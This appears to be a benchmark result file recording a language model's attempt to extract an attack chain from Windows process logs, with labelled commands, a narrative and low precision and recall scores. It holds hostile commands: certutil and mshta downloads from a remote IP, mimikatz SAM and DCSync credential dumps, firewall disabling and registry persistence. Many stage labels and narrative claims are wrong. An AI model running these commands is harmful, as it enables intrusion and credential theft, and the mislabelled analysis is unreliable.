@@ -1,0 +1,202 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "msedge.exe --no-startup-window /prefetch:5",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe --type=gpu-process --gpu-preferences=UAAAAAAAAADgAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAASAAAAAAAAAAYAAAAAgAAABAAAAAAAAAAGAAAAAAAAAAQAAAAAAAAAAAAAAAOAAAAEAAAAAAAAAABAAAADgAAAAgAAAAAAAAACAAAAAAAAAA= --mojo-platform-channel-handle=1960 --field-trial-handle=1812,i,13969245107114674510,14049462321786369646,131072 /prefetch:2",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\\u0635\\u062f...\\B.ps1",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C '\\',",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd.exe /C spolsv.exe",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo test >> test.exe\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "del /f HookSSLX64.dll",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1003.003\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119 \"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe';Invoke-AtomicTest T1220  -TestNumbers 1\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"C:\\Path\\AtomicRedTeam.exe\" ",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \" /v \"verifierdlls \" /d \"1 \" /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \".\\chromeRemoteServices.ps1\" ",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \".\\chromeRemoteServices.ps1\" ",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \".\\chromeRemoteServices.ps1\" ",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \".\\chromeRemoteServices.ps1\" ",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \".\\chromeRemoteServices.ps1\" ",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \".\\chromeRemoteServices.ps1\" ",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "reg delete \"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \" /v verifierdlls /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "python.exe \"C:\\Users\\Administrator\\Desktop\\shell\\T1059.006.py\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "Netsh Advfirewall show allprofiles ",
+        "stage": "Discovery"
+      },
+      {
+        "command": "NetSh Advfirewall?set?allprofiles state off ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /C T1059.006.py",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil.exe -decode a.txt b.txt",
+        "stage": "Collection"
+      },
+      {
+        "command": "rm /s /q timestomp",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "\"mimikatz2.exe   lsadump::sam exit\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "mimikatz.exe   LSADUMP::DCSync exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "notepad.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell \"& {if (Test-Path $env:TEMP\\T1059.003_script.bat) {exit 0} else {exit 1}} \"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "\"cmd.exe\" /c notepad.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "rundll32.exe user32.dll,LockWorkStation",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "The identified attack chain consists of various elements, starting with Initial Access through msedge.exe and powershell.exe, followed by Execution of malicious code via python.exe, cmd.exe, and rundll32.exe. Persistence was established through certificate utilization and registry modifications. Defense Evasion involved deletion of files and modification of registry values. Lateral Movement occurred via mimikatz and python.exe. Credential Access was achieved through mimikatz and net localgroup. Finally, Command and Control interactions were facilitated through HTTP requests.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 121950,
+      "completion_tokens": 4464,
+      "total_tokens": 126414,
+      "wall_clock_s": 60.009,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.15789473684210525,
+      "recall": 0.2608695652173913,
+      "f1": 0.19672131147540983,
+      "tp": 6,
+      "fp": 32,
+      "fn": 17
+    },
+    "stage": {
+      "precision": 0.05263157894736842,
+      "recall": 0.08695652173913043,
+      "f1": 0.06557377049180328,
+      "tp": 2,
+      "fp": 36,
+      "fn": 21,
+      "recall_partial": 0.17391304347826086
+    },
+    "hallucination_rate": 0.07407407407407407,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 121950,
+      "completion_tokens": 4464,
+      "total_tokens": 126414,
+      "wall_clock_s": 60.009,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v2_maxtok4096",
+    "max_tokens": 4096,
+    "prompt_variant": "base",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
